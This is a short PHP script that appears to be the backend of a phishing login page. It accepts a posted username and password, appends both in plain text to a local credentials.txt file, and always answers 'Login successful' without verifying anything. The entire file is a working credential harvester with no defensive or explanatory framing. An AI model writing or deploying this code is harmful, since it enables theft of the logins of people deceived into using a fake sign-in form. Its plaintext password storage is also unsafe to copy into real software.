<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Save credentials to a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);

    echo "Login successful";
} else {
    echo "Invalid request method.";
}
?>
